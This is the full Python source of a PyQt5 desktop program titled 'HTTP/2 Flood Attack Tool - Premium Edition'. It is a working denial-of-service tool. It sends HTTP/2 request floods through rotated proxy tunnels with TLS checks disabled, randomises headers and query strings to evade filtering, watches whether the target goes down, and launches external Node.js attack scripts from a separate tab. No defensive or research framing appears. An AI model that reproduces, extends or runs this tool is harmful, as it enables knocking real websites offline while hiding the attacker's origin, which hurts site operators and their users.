import sys
import os
import random
import time
import threading
import socket
import ssl
import subprocess
import certifi
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout,
    QHBoxLayout, QPushButton, QTextEdit, QLabel,
    QLineEdit, QGridLayout, QGroupBox, QProgressBar,
    QFileDialog, QMessageBox, QSpinBox, QTabWidget, QComboBox
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QTextCursor
import h2.connection
import h2.events
import pyqtgraph as pg  # grafik realtime

# =====================================================
# HTTP/2 Flood Worker
# =====================================================
class HTTP2FloodWorker(QThread):
    update_signal = pyqtSignal(str, str)   # log message, color
    progress_signal = pyqtSignal(int)
    finished_signal = pyqtSignal()
    stats_signal = pyqtSignal(dict)        # statistik

    def __init__(self, target, duration, rate, threads, proxy_file):
        super().__init__()
        self.target = target
        self.duration = duration
        self.rate = rate
        self.threads = threads
        self.proxy_file = proxy_file
        self.is_running = True
        self.stats = {
            'requests_sent': 0,
            'successful_responses': 0,
            'failed_responses': 0,
            'errors': 0
        }

    def run(self):
        self.start_time = time.time()
        self.end_time = self.start_time + self.duration

        # Load proxies
        try:
            with open(self.proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.update_signal.emit(f"Error loading proxies: {str(e)}", "red")
            self.finished_signal.emit()
            return

        if not self.proxies:
            self.update_signal.emit("No proxies loaded from file", "red")
            self.finished_signal.emit()
            return

        self.update_signal.emit(f"Loaded {len(self.proxies)} proxies", "green")

        # Start attack threads
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while time.time() < self.end_time and self.is_running:
                for _ in range(self.rate):
                    executor.submit(self.attack_request)
                time.sleep(0.1)  # small delay

        self.finished_signal.emit()

    def stop(self):
        self.is_running = False

    def attack_request(self):
        try:
            proxy = random.choice(self.proxies)
            proxy_host, proxy_port = proxy.split(':')
            proxy_port = int(proxy_port)

            parsed_target = urlparse(self.target)
            target_host = parsed_target.hostname
            target_port = parsed_target.port or 443
            target_path = parsed_target.path or '/'

            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)  # ⚡ sesuai permintaan
            sock.connect((proxy_host, proxy_port))
            self.update_signal.emit(f"Proxy connected: {proxy}", "cyan")

            # Proxy tunnel
            connect_request = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n"
            sock.send(connect_request.encode())
            response = sock.recv(4096).decode()
            if "200" not in response:
                self.stats['errors'] += 1
                self.update_signal.emit(f"Proxy {proxy} tunnel failed", "red")
                sock.close()
                return
            self.update_signal.emit(f"Tunnel established → {target_host}:{target_port}", "green")

            # SSL wrap
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=target_host)

            # HTTP/2 init
            conn = h2.connection.H2Connection()
            conn.initiate_connection()
            ssl_sock.send(conn.data_to_send())

            # Headers
            headers = self.generate_headers(target_host, target_path)
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, headers)
            ssl_sock.send(conn.data_to_send())
            self.update_signal.emit(f"Sent HTTP/2 request → {target_host}{target_path}", "yellow")

            self.stats['requests_sent'] += 1
            self.stats_signal.emit(self.stats.copy())

            # Response
            try:
                data = ssl_sock.recv(65535)
                if data:
                    events = conn.receive_data(data)
                    for event in events:
                        if isinstance(event, h2.events.ResponseReceived):
                            self.stats['successful_responses'] += 1
                            self.stats_signal.emit(self.stats.copy())
                            self.update_signal.emit("Response received ✅ 200 OK", "green")
            except:
                self.stats['failed_responses'] += 1
                self.stats_signal.emit(self.stats.copy())
                self.update_signal.emit("Response failed ❌", "red")

            ssl_sock.close()

        except Exception as e:
            self.stats['errors'] += 1
            self.stats_signal.emit(self.stats.copy())
            self.update_signal.emit(f"Error: {str(e)}", "red")

    def generate_headers(self, host, path):
        accept_headers = [
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        ]

        ua_file = "ua.txt"
        user_agents = []
        if os.path.exists(ua_file):
            try:
                with open(ua_file, "r", encoding="utf-8", errors="ignore") as f:
                    user_agents = [line.strip() for line in f if line.strip()]
            except Exception:
                user_agents = []

        if not user_agents:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
            ]

        languages = ["en-US,en;q=0.9", "es-ES,es;q=0.8", "fr-FR,fr;q=0.7", "de-DE,de;q=0.6"]

        headers = [
            (':method', 'GET'),
            (':authority', host),
            (':scheme', 'https'),
            (':path', f"{path}?{random.randint(1000, 9999)}"),
            ('user-agent', random.choice(user_agents)),
            ('accept', random.choice(accept_headers)),
            ('accept-language', random.choice(languages)),
            ('accept-encoding', 'gzip, deflate, br'),
            ('cache-control', 'no-cache'),
            ('pragma', 'no-cache'),
            ('upgrade-insecure-requests', '1'),
        ]
        return headers
# =====================================================
# Target Monitor (check status & response time)
# =====================================================
class TargetMonitor(QThread):
    status_signal = pyqtSignal(str, str)  # msg, color

    def __init__(self, target):
        super().__init__()
        self.target = target
        self.running = True

    def run(self):
        parsed = urlparse(self.target)
        host = parsed.hostname
        port = parsed.port or 443

        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                start = time.time()
                sock.connect((host, port))
                end = time.time()
                latency = int((end - start) * 1000)
                self.status_signal.emit(f"UP - 200 OK ({latency} ms)", "green")
                sock.close()
            except Exception:
                self.status_signal.emit("DOWN ❌", "red")
            time.sleep(2)

    def stop(self):
        self.running = False


# =====================================================
# Main GUI Class
# =====================================================
class HTTP2FloodGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("HTTP/2 Flood Attack Tool - Premium Edition")
        self.setGeometry(100, 100, 1100, 750)
        self.worker = None
        self.monitor = None

        # ---------------- STYLE ----------------
        self.setStyleSheet("""
            QMainWindow {
                background-color: #000000;
            }
            QWidget {
                background-color: #111111;
                color: #39FF14;
            }
            QPushButton {
                background-color: #39FF14;
                color: black;
                border: none;
                padding: 8px;
                border-radius: 4px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00FF00;
            }
            QPushButton:pressed {
                background-color: #009900;
            }
            QPushButton:disabled {
                background-color: #444444;
                color: #777777;
            }
            QTextEdit {
                background-color: #000000;
                color: #00FF00;
                border: 1px solid #39FF14;
                border-radius: 4px;
                font-family: Consolas, Monaco, monospace;
            }
            QLabel {
                color: #39FF14;
            }
            QLineEdit, QSpinBox, QComboBox {
                background-color: #000000;
                color: #39FF14;
                border: 1px solid #39FF14;
                border-radius: 4px;
                padding: 5px;
            }
            QGroupBox {
                color: #39FF14;
                border: 1px solid #39FF14;
                border-radius: 5px;
                margin-top: 1ex;
                font-weight: bold;
            }
            QProgressBar {
                border: 1px solid #39FF14;
                border-radius: 4px;
                text-align: center;
                background-color: #000000;
                color: #39FF14;
            }
            QProgressBar::chunk {
                background-color: #39FF14;
            }
        """)

        # ---------------- LAYOUT ----------------
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        # Title
        title = QLabel("⚡ HTTP/2 Flood Attack Tool - Premium Edition")
        title.setFont(QFont("Arial", 16, QFont.Bold))
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet("color: #39FF14; padding: 10px;")
        layout.addWidget(title)

        # Tabs
        self.tabs = QTabWidget()
        self.attack_tab = QWidget()
        self.stats_tab = QWidget()
        self.console_tab = QWidget()
        self.js_tab = QWidget()

        self.tabs.addTab(self.attack_tab, "⚙️ Attack Settings")
        self.tabs.addTab(self.stats_tab, "📊 Statistics")
        self.tabs.addTab(self.console_tab, "💻 Realtime Console")
        self.tabs.addTab(self.js_tab, "🕹️ JS Methods Attack")

        layout.addWidget(self.tabs)
        # ---------------- ATTACK TAB ----------------
        attack_layout = QVBoxLayout(self.attack_tab)

        # Input Section
        input_group = QGroupBox("⚙️ Attack Parameters")
        input_layout = QGridLayout()

        lbl_url = QLabel("🌍 Target URL:")
        lbl_url.setFont(QFont("Arial", 11, QFont.Bold))
        input_layout.addWidget(lbl_url, 0, 0)
        self.target_input = QLineEdit("https://example.com")
        input_layout.addWidget(self.target_input, 0, 1, 1, 2)

        lbl_duration = QLabel("⏳ Duration (seconds):")
        lbl_duration.setFont(QFont("Arial", 11, QFont.Bold))
        input_layout.addWidget(lbl_duration, 1, 0)
        self.duration_input = QSpinBox()
        self.duration_input.setRange(1, 7200)
        self.duration_input.setValue(60)
        input_layout.addWidget(self.duration_input, 1, 1, 1, 2)

        lbl_rate = QLabel("📈 Request Rate:")
        lbl_rate.setFont(QFont("Arial", 11, QFont.Bold))
        input_layout.addWidget(lbl_rate, 2, 0)
        self.rate_input = QSpinBox()
        self.rate_input.setRange(1, 2000)
        self.rate_input.setValue(10)
        input_layout.addWidget(self.rate_input, 2, 1, 1, 2)

        lbl_threads = QLabel("🧵 Threads:")
        lbl_threads.setFont(QFont("Arial", 11, QFont.Bold))
        input_layout.addWidget(lbl_threads, 3, 0)
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, 200)
        self.threads_input.setValue(10)
        input_layout.addWidget(self.threads_input, 3, 1, 1, 2)

        lbl_proxy = QLabel("🛠️ Proxy File:")
        lbl_proxy.setFont(QFont("Arial", 11, QFont.Bold))
        input_layout.addWidget(lbl_proxy, 4, 0)
        self.proxy_input = QLineEdit("proxies.txt")
        input_layout.addWidget(self.proxy_input, 4, 1)
        self.browse_btn = QPushButton("Browse")
        self.browse_btn.clicked.connect(self.browse_proxy_file)
        input_layout.addWidget(self.browse_btn, 4, 2)

        input_group.setLayout(input_layout)
        attack_layout.addWidget(input_group)

        # Buttons
        button_layout = QHBoxLayout()
        self.start_btn = QPushButton("▶️ Start Attack")
        self.start_btn.clicked.connect(self.start_attack)
        button_layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("⏹️ Stop Attack")
        self.stop_btn.clicked.connect(self.stop_attack)
        self.stop_btn.setEnabled(False)
        button_layout.addWidget(self.stop_btn)

        attack_layout.addLayout(button_layout)

        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setValue(0)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 1px solid #39FF14;
                border-radius: 4px;
                text-align: center;
                background-color: #000000;
                color: #39FF14;
            }
            QProgressBar::chunk {
                background-color: #39FF14;
                width: 10px;
            }
        """)
        attack_layout.addWidget(self.progress_bar)
        # ---------------- STATISTICS TAB ----------------
        stats_layout = QVBoxLayout(self.stats_tab)

        stats_group = QGroupBox("📊 Realtime Statistics")
        stats_grid = QGridLayout()

        lbl_req = QLabel("Requests Sent:")
        lbl_req.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_req, 0, 0)
        self.requests_label = QLabel("0")
        self.requests_label.setFont(QFont("Consolas", 11, QFont.Bold))
        self.requests_label.setStyleSheet("color: #39FF14;")
        stats_grid.addWidget(self.requests_label, 0, 1)

        lbl_success = QLabel("Successful Responses:")
        lbl_success.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_success, 1, 0)
        self.success_label = QLabel("0")
        self.success_label.setFont(QFont("Consolas", 11, QFont.Bold))
        self.success_label.setStyleSheet("color: #39FF14;")
        stats_grid.addWidget(self.success_label, 1, 1)

        lbl_failed = QLabel("Failed Responses:")
        lbl_failed.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_failed, 2, 0)
        self.failed_label = QLabel("0")
        self.failed_label.setFont(QFont("Consolas", 11, QFont.Bold))
        self.failed_label.setStyleSheet("color: #FF3333;")
        stats_grid.addWidget(self.failed_label, 2, 1)

        lbl_errors = QLabel("Errors:")
        lbl_errors.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_errors, 3, 0)
        self.errors_label = QLabel("0")
        self.errors_label.setFont(QFont("Consolas", 11, QFont.Bold))
        self.errors_label.setStyleSheet("color: #FF3333;")
        stats_grid.addWidget(self.errors_label, 3, 1)

        lbl_rps = QLabel("Requests per Second:")
        lbl_rps.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_rps, 4, 0)
        self.rps_label = QLabel("0")
        self.rps_label.setFont(QFont("Consolas", 11, QFont.Bold))
        self.rps_label.setStyleSheet("color: #39FF14;")
        stats_grid.addWidget(self.rps_label, 4, 1)

        lbl_status = QLabel("Target Status:")
        lbl_status.setFont(QFont("Arial", 11, QFont.Bold))
        stats_grid.addWidget(lbl_status, 5, 0)
        self.target_status_label = QLabel("Unknown")
        self.target_status_label.setFont(QFont("Consolas", 11, QFont.Bold))
        self.target_status_label.setStyleSheet("color: #FFFF33;")
        stats_grid.addWidget(self.target_status_label, 5, 1)

        stats_group.setLayout(stats_grid)
        stats_layout.addWidget(stats_group)

        # Graph RPS
        graph_group = QGroupBox("📈 RPS Graph")
        graph_layout = QVBoxLayout()
        self.rps_plot = pg.PlotWidget()
        self.rps_plot.setBackground('k')
        self.rps_plot.showGrid(x=True, y=True)
        self.rps_plot.setLabel('left', 'RPS')
        self.rps_plot.setLabel('bottom', 'Time (s)')
        self.rps_curve = self.rps_plot.plot(pen=pg.mkPen('#39FF14', width=2))
        self.rps_data = []
        self.rps_time = []
        graph_layout.addWidget(self.rps_plot)
        graph_group.setLayout(graph_layout)
        stats_layout.addWidget(graph_group)
        # ---------------- CONSOLE TAB ----------------
        console_layout = QVBoxLayout(self.console_tab)

        lbl_console = QLabel("💻 Realtime Console Log:")
        lbl_console.setFont(QFont("Arial", 12, QFont.Bold))
        console_layout.addWidget(lbl_console)

        self.console_output = QTextEdit()
        self.console_output.setReadOnly(True)
        self.console_output.setFont(QFont("Consolas", 10))
        console_layout.addWidget(self.console_output)

        # ---------------- JS METHODS TAB ----------------
        js_layout = QVBoxLayout(self.js_tab)

        js_group = QGroupBox("🕹️ Run JavaScript Attack Method")
        js_grid = QGridLayout()

        lbl_jsfile = QLabel("📂 Select JS File:")
        lbl_jsfile.setFont(QFont("Arial", 11, QFont.Bold))
        js_grid.addWidget(lbl_jsfile, 0, 0)
        self.js_file_combo = QComboBox()
        self.refresh_js_files()
        js_grid.addWidget(self.js_file_combo, 0, 1)
        self.refresh_btn = QPushButton("🔄 Refresh")
        self.refresh_btn.clicked.connect(self.refresh_js_files)
        js_grid.addWidget(self.refresh_btn, 0, 2)

        lbl_jstime = QLabel("⏳ Time (s):")
        lbl_jstime.setFont(QFont("Arial", 11, QFont.Bold))
        js_grid.addWidget(lbl_jstime, 1, 0)
        self.js_time_input = QSpinBox()
        self.js_time_input.setRange(1, 7200)
        self.js_time_input.setValue(60)
        js_grid.addWidget(self.js_time_input, 1, 1, 1, 2)

        lbl_jsrate = QLabel("📈 Rate:")
        lbl_jsrate.setFont(QFont("Arial", 11, QFont.Bold))
        js_grid.addWidget(lbl_jsrate, 2, 0)
        self.js_rate_input = QSpinBox()
        self.js_rate_input.setRange(1, 2000)
        self.js_rate_input.setValue(10)
        js_grid.addWidget(self.js_rate_input, 2, 1, 1, 2)

        lbl_jsthreads = QLabel("🧵 Threads:")
        lbl_jsthreads.setFont(QFont("Arial", 11, QFont.Bold))
        js_grid.addWidget(lbl_jsthreads, 3, 0)
        self.js_threads_input = QSpinBox()
        self.js_threads_input.setRange(1, 200)
        self.js_threads_input.setValue(10)
        js_grid.addWidget(self.js_threads_input, 3, 1, 1, 2)

        lbl_jsproxy = QLabel("🛠️ Proxy File:")
        lbl_jsproxy.setFont(QFont("Arial", 11, QFont.Bold))
        js_grid.addWidget(lbl_jsproxy, 4, 0)
        self.js_proxy_input = QLineEdit("proxies.txt")
        js_grid.addWidget(self.js_proxy_input, 4, 1)
        self.js_proxy_browse = QPushButton("Browse")
        self.js_proxy_browse.clicked.connect(self.browse_js_proxy_file)
        js_grid.addWidget(self.js_proxy_browse, 4, 2)

        self.run_js_btn = QPushButton("▶️ Run JS Attack")
        self.run_js_btn.clicked.connect(self.run_js_attack)
        js_grid.addWidget(self.run_js_btn, 5, 0, 1, 3)

        js_group.setLayout(js_grid)
        js_layout.addWidget(js_group)

    # ================= Utility for JS Tab =================
    def refresh_js_files(self):
        self.js_file_combo.clear()
        js_files = [f for f in os.listdir('.') if f.endswith('.js')]
        if js_files:
            self.js_file_combo.addItems(js_files)
        else:
            self.js_file_combo.addItem("No JS files found")

    def browse_js_proxy_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Proxy File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            self.js_proxy_input.setText(file_path)

    def run_js_attack(self):
        js_file = self.js_file_combo.currentText()
        if not js_file.endswith('.js'):
            QMessageBox.warning(self, "Warning", "Please select a valid .js file")
            return
        cmd = [
            "node", js_file,
            str(self.js_time_input.value()),
            str(self.js_rate_input.value()),
            str(self.js_threads_input.value()),
            self.js_proxy_input.text()
        ]
        self.update_log("Running: " + " ".join(cmd), "yellow")
        try:
            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            threading.Thread(target=self.stream_js_output, args=(process,)).start()
        except Exception as e:
            self.update_log("JS Error: " + str(e), "red")

    def stream_js_output(self, process):
        for line in process.stdout:
            self.update_log(line.strip(), "cyan")
    # ==================== ATTACK CONTROL ====================
    def browse_proxy_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Proxy File", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            self.proxy_input.setText(file_path)

    def start_attack(self):
        target = self.target_input.text()
        duration = self.duration_input.value()
        rate = self.rate_input.value()
        threads = self.threads_input.value()
        proxy_file = self.proxy_input.text()

        if not target.startswith("https://"):
            QMessageBox.warning(self, "Warning", "Target URL must start with https://")
            return
        if not os.path.exists(proxy_file):
            QMessageBox.warning(self, "Warning", "Proxy file does not exist")
            return

        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress_bar.setValue(0)
        self.console_output.clear()
        self.update_log("⚡ Attack started...", "yellow")

        # reset stats
        self.stats = {
            'requests_sent': 0,
            'successful_responses': 0,
            'failed_responses': 0,
            'errors': 0,
            'start_time': time.time()
        }
        self.update_stats_display()

        # start worker
        self.worker = HTTP2FloodWorker(target, duration, rate, threads, proxy_file)
        self.worker.update_signal.connect(self.update_log)
        self.worker.stats_signal.connect(self.update_stats)
        self.worker.finished_signal.connect(self.on_attack_finished)
        self.worker.start()

        # start monitor
        self.monitor = TargetMonitor(target)
        self.monitor.status_signal.connect(self.update_target_status)
        self.monitor.start()

        # progress bar timer
        self.attack_duration = duration
        self.elapsed_time = 0
        self.progress_timer = QTimer()
        self.progress_timer.timeout.connect(self.update_progress)
        self.progress_timer.start(1000)

    def stop_attack(self):
        if self.worker:
            self.worker.stop()
            self.worker.wait()
        if self.monitor:
            self.monitor.stop()
            self.monitor.wait()
        if hasattr(self, "progress_timer"):
            self.progress_timer.stop()
        self.on_attack_finished()
        self.update_log("⏹️ Attack stopped manually.", "red")

    def on_attack_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        if hasattr(self, "progress_timer"):
            self.progress_timer.stop()
        if self.monitor:
            self.monitor.stop()
        self.update_log("✅ Attack finished.", "green")
        self.progress_bar.setValue(100)

    # ==================== UPDATE UI ====================
    def update_log(self, message, color):
        color_map = {
            "red": "#FF3333",
            "green": "#39FF14",
            "yellow": "#FFFF33",
            "cyan": "#33FFFF",
            "white": "#FFFFFF"
        }
        html = f'<span style="color:{color_map.get(color,"#FFFFFF")};">{message}</span><br>'
        self.console_output.moveCursor(QTextCursor.End)
        self.console_output.insertHtml(html)
        self.console_output.moveCursor(QTextCursor.End)

    def update_stats(self, stats):
        self.stats.update(stats)
        self.update_stats_display()

    def update_stats_display(self):
        self.requests_label.setText(str(self.stats['requests_sent']))
        self.success_label.setText(str(self.stats['successful_responses']))
        self.failed_label.setText(str(self.stats['failed_responses']))
        self.errors_label.setText(str(self.stats['errors']))
        elapsed = time.time() - self.stats['start_time']
        if elapsed > 0:
            rps = self.stats['requests_sent'] / elapsed
            self.rps_label.setText(f"{rps:.2f}")
            self.rps_data.append(rps)
            self.rps_time.append(int(elapsed))
            self.rps_curve.setData(self.rps_time, self.rps_data)

    def update_target_status(self, msg, color):
        color_map = {
            "red": "#FF3333",
            "green": "#39FF14",
            "yellow": "#FFFF33"
        }
        self.target_status_label.setText(msg)
        self.target_status_label.setStyleSheet(f"color: {color_map.get(color,'#FFFFFF')}; font-weight: bold;")

    def update_progress(self):
        self.elapsed_time += 1
        progress = int((self.elapsed_time / self.attack_duration) * 100)
        self.progress_bar.setValue(progress)
        if self.elapsed_time >= self.attack_duration:
            self.stop_attack()

# =====================================================
# MAIN
# =====================================================
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = HTTP2FloodGUI()
    window.show()
    sys.exit(app.exec_())
